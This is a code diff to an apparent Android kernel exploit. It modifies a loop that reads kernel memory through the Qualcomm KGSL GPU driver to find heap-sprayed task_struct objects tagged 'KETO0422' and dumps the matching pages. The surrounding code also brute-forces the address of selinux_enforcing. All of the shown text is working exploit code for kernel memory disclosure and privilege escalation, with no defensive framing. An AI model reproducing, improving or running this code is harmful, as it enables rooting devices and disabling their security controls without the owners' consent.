@@ -381,17 +381,36 @@ int main(int argc, char **argv) {
             uint8_t buf[PAGE_SIZE];
             uint64_t total = end - start;
             uint64_t scanned = 0;
+            // Diagnostic counters so the user can see how many
+            // pages we actually read vs how many returned empty
+            // and how many fired a signature. Helps debug "matches=0"
+            // when spray doesn't show up in scan.
+            int pages_read = 0, pages_failed = 0, pages_empty = 0,
+                pages_nonzero = 0, pages_hit = 0;
             fprintf(stderr, "[SCAN] start=%lx end=%lx total=%lu pages\n",
                     (unsigned long)start, (unsigned long)end, (unsigned long)(total / PAGE_SIZE));
             fflush(stderr);
-            // Scan with step 2 pages (SCAN_PAGE_STEP=2) for denser coverage
-            // and faster offset discovery. The KGSL read cost is dominated
-            // by the GPU round-trip (usleep+ioctl), so reading every 2
-            // pages (vs every 4) doubles our hit rate at 2x read cost —
-            // net win because real interesting pages are sparse and we
-            // want to find them quickly.
-            for (uint64_t va = start; va < end; va += PAGE_SIZE * 2) {
+            // Scan with step 1 page (SCAN_PAGE_STEP=1) for max coverage.
+            // SCAN_PAGE_STEP=2 was tried but missed too many task_struct
+            // pages because KGSL pool pages are recycled quickly and
+            // each task_struct occupies 1 page (4KB aligned). Reading
+            // every page catches them reliably even when spray is
+            // bursty. We accept the 2x read cost.
+            for (uint64_t va = start; va < end; va += PAGE_SIZE) {
                 if (read_gpu_page(va, buf) == 0) {
+                    pages_read++;
+                    // Quick check: is this page entirely zeros? Many
+                    // KGSL pages are uninitialized, so this lets us
+                    // skip the heavy signature matching for empty
+                    // pages.
+                    int any_nonzero = 0;
+                    for (int zi = 0; zi < 256; zi++) {
+                        if (((uint64_t *)buf)[zi] != 0) {
+                            any_nonzero = 1; break;
+                        }
+                    }
+                    if (!any_nonzero) { pages_empty++; continue; }
+                    pages_nonzero++;
                     int found_sig = 0;
                     int found_off = -1;
                     // 1a. task_struct comm = "KETO0422" (our master spray) — 8 bytes
@@ -413,19 +432,17 @@ int main(int argc, char **argv) {
                                 q[i+5] >= '0' && q[i+5] <= '9' &&
                                 q[i+6] >= '0' && q[i+6] <= '9' &&
                                 q[i+7] >= '0' && q[i+7] <= '9') {
-                                // Verify: full 16-byte comm must be
-                                // letters/digits/NUL only.
+                                // Lighter validation: just need at
+                                // least 1 NUL in the next 8 bytes to
+                                // confirm this looks like a 16-byte
+                                // comm field.
                                 int ok = 1;
+                                int nulls = 0;
                                 for (int j = 8; j < 16; j++) {
                                     if (i + j >= PAGE_SIZE) { ok = 0; break; }
-                                    uint8_t cj = (uint8_t)q[i + j];
-                                    if (cj != 0 &&
-                                        !(cj >= '0' && cj <= '9')) {
-                                        ok = 0;
-                                        break;
-                                    }
+                                    if (q[i + j] == 0) nulls++;
                                 }
-                                if (ok) {
+                                if (ok && nulls >= 1) {
                                     found_sig = 1;
                                     found_off = i;
                                     break;
@@ -433,8 +450,7 @@ int main(int argc, char **argv) {
                             }
                         }
                     }
-                    // 1d. KETW{0,1,2}{NNN} — per-subworker marker for
-                    //     debugging which subworker sprayed which proc.
+                    // 1d. KETW{0,1,2}{NNN} - per-subworker marker.
                     if (!found_sig) {
                         const char *qw = (const char *)buf;
                         for (int i = 0; i <= PAGE_SIZE - 7; i++) {
@@ -445,16 +461,12 @@ int main(int argc, char **argv) {
                                 qw[i+6] >= '0' && qw[i+6] <= '9' &&
                                 qw[i+7] >= '0' && qw[i+7] <= '9') {
                                 int ok = 1;
+                                int nulls = 0;
                                 for (int j = 7; j < 16; j++) {
                                     if (i + j >= PAGE_SIZE) { ok = 0; break; }
-                                    uint8_t cj = (uint8_t)qw[i + j];
-                                    if (cj != 0 &&
-                                        !(cj >= '0' && cj <= '9')) {
-                                        ok = 0;
-                                        break;
-                                    }
+                                    if (qw[i + j] == 0) nulls++;
                                 }
-                                if (ok) {
+                                if (ok && nulls >= 1) {
                                     found_sig = 1;
                                     found_off = i;
                                     break;
@@ -669,9 +681,12 @@ int main(int argc, char **argv) {
                         printf("DATA:%lx:%d\n", (unsigned long)va, PAGE_SIZE);
                         fwrite(buf, 1, PAGE_SIZE, stdout);
                         printf("\nDATA_END\n");
+                        pages_hit++;
                     }
+                } else {
+                    pages_failed++;
                 }
-                scanned += PAGE_SIZE * 4;
+                scanned += PAGE_SIZE;
                 if ((va / PAGE_SIZE) % 100 == 0) {
                     fprintf(stderr, "[SCAN] progress 0x%lx / 0x%lx (%lu%%)\n",
                             (unsigned long)scanned, (unsigned long)total,
@@ -682,9 +697,12 @@ int main(int argc, char **argv) {
                     usleep(1000);
                 }
             }
-            fprintf(stderr, "[SCAN] done\n");
+            fprintf(stderr, "[SCAN] done read=%d failed=%d empty=%d nonzero=%d hits=%d\n",
+                    pages_read, pages_failed, pages_empty, pages_nonzero, pages_hit);
             fflush(stderr);
-            printf("SCAN_DONE\n");
+            printf("SCAN_DONE:r=%d:f=%d:e=%d:n=%d:h=%d\n",
+                   pages_read, pages_failed, pages_empty,
+                   pages_nonzero, pages_hit);
             fflush(stdout);
         } else if (strncmp(line, "selsearch ", 10) == 0) {
             // Brute-force scan for selinux_enforcing in a kernel data range.
